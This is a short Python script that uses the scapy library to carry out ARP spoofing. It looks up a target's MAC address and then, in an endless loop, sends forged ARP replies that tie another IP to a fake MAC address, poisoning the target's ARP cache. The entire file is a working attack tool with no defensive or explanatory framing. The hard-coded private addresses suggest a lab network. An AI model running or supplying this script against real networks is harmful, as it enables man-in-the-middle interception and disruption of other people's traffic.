import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip, t_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=t_mac,
                       psrc=spoof_ip, hwsrc="f4:aa:bb:cc:dd:ff") # fake mac addr
    print(packet.summary())
    scapy.send(packet, verbose=False)


target_ip = "10.10.0.1"  # dest

spoof_ip = "10.10.14.129"  # src
t_mac = get_mac(target_ip)
print(t_mac)
while 1:
    try:
        spoof(target_ip, spoof_ip, t_mac)
        time.sleep(2)
        print("send req")
    except:
        pass